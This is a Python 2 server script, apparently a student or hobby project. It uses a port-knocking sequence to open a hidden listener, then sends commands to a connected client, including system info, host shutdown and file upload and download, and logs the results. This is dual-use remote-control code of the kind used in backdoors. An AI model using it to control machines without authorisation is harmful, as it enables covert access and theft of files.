#!/usr/bin/env python2
# Author: Cory Nance
# Date:   15 January 2018

import socket
import sys
import argparse
import time
import csv
import calendar
import hashlib
import base64

# supported commands
cmds = ['sys_info', 'get_date', 'get_ip', 'get_mac', 'exit', 'shutdown_client', 'shutdown_host', 'upload', 'get', '?']

def get_cmd():
	""" helper function to get a valid command from the user """
	cmd = raw_input('Please enter a command: ')
	
	while cmd.split()[0] not in cmds:
		print "%s is not a supported command.  Use '?' to see all commands." % cmd
		cmd = raw_input('Please enter a command: ')
	return cmd


def knock(ip, ports, func, log):
	""" 
	recurively listen on the ports in the port list then call func 
	:param ip: the remote ip address
	:param ports: A list of ports to listen on.  The last port is passed to func to listen on.
	:param func: The function to call after knocking on all but the last port
	:param log: The path to the log file
	"""
	# if this is the last port then call func
	if len(ports) == 1:
		func(ip, ports[0], log)
		return

	# this shouldn't happen :-)
	if len(ports) == 0:
		return

	port = ports[0]

	# create the socket object
	s = socket.socket() 
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((ip, port))

	# put the socket into listen mode
	s.listen(5) 
	print 'Server is listening on %s:%d and waiting for connections...' % ('*' if ip == '' else ip, port)
	
	# accept anything then close
	s.accept() 
	s.close()
	
	# keep knocking...
	knock(ip, ports[1:], func, log)

def upload(orig_cmd, socket_connection, addr, csv_writer):
	"""
	upload a file to the client
	:param orig_cmd: the original cmd
	:param socket_connection: a socket connection with the client
	:param addr: the addr tuple containing ip and port from the client
	:param csv_writer: a csvwriter object for the log file
	"""
	local_path = raw_input('Local file path: ')
	remote_path = raw_input('Remote file path: ')

	with open(local_path, 'rb') as local_file:
		enc_file = base64.b64encode(local_file.read())
		
		# ask client to enter ready states
		md5 = hashlib.md5()
		md5.update(enc_file)
		socket_connection.send('upload %s' % md5.hexdigest())
		
		wait = socket_connection.recv(1024)
		if wait != 'accept':
			print '[*ERROR] Expected %s but received %s' % ('accept', wait)
			return
		socket_connection.send(remote_path)
		
		wait = socket_connection.recv(1024)
		if wait != 'ready':
			print '[*ERROR] Expected %s but received %s' % ('ready', wait)
			return

		socket_connection.send(enc_file)
		socket_connection.send('\ndone')
		
		wait = socket_connection.recv(1024)
		if wait == 'saved':
			csv_writer.writerow([calendar.timegm(time.gmtime()), addr[0], addr[1], "%s %s %s" % (orig_cmd, local_path, remote_path), md5.hexdigest()])
		else:
			print '[*ERROR] Expected %s but received %s' % ('saved', wait)
			return

def get(socket_connection):
	"""
	receives a file from the client and saves it to a specified location
	:param cmd: the original upload command with md5 checksum
	:param socket_connection: a socket connection with the server
	"""
	local_path = raw_input('Local file path: ')
	remote_path = raw_input('Remote file path: ')
	socket_connection.send('get %s' % local_path)

	md5sum = socket_connection.recv(1024)

	socket_connection.send('ready')
	payload = ''
	while payload[-5:] != '\ndone':
		chunk = socket_connection.recv(1024)
		payload += chunk

	# remove '\ndone'
	payload = payload[:-5]

	# check md5 checksum
	md5 = hashlib.md5()
	md5.update(payload)
	print 'md5: %s' % md5.hexdigest()
	if md5sum != md5.hexdigest():
		socket_connection.send('invalid checksum')
	else:
		with open(local_path, 'wb') as out:
			dec_file = base64.b64decode(payload)
			out.write(dec_file)

		socket_connection.send('saved')
		print 'File saved to: %s' % local_path

def server(ip, port, log):
	"""
	The main server function.  This function gets commands from the user, dispatches the command to helper function (or simply passes it to the client), and logs data to the log file.
	:param ip: the ip address that the server should bind to
	:param port: the port that the server should bind on
	:param log: the filepath to the log file
	"""
	s = socket.socket()
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((ip, port))
	s.listen(5)

	print 'Server is listening on %s:%d and waiting for connections...' % ('*' if ip == '' else ip, port)
	c, addr = s.accept()
	print 'connection accepted from %s' % addr[0]
	with open(log, 'a') as out:
		csv_writer = csv.writer(out, quoting=csv.QUOTE_MINIMAL)
		current_size = out.tell()
		if current_size == 0:
			csv_writer.writerow(['timestamp', 'ip', 'port', 'cmd', 'results'])

		cmd = get_cmd()
		while cmd != 'exit':
			if cmd == '?':
				for index, cmd in enumerate(cmds):
					print '%d: %s' % (index + 1, cmd)
			elif cmd == 'upload':
				upload(cmd, c, addr, csv_writer)
			elif cmd == 'get':
				get(c)
			else: 
				# send the command
				c.send(cmd)

				# print the results
				results = c.recv(1024)
				print results
				csv_writer.writerow([calendar.timegm(time.gmtime()), addr[0], addr[1], cmd, results])
			cmd = get_cmd()

def main():
	""" parse arguments and start port knocking """
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', type=str, default='', help='IP address to bind to.')
	parser.add_argument('--ports', type=int, nargs='+', default=[53, 80], help='Ports to knock on.')
	parser.add_argument('--file', type=str, default='clients.csv', help='Path to clients csv file.')
	args = parser.parse_args()

	print 'Press ctrl-c to terminate client.'
	try:
		while True:
			knock(args.ip, args.ports, server, args.file)
	except KeyboardInterrupt:
		print ''

if __name__ == '__main__':
	main()


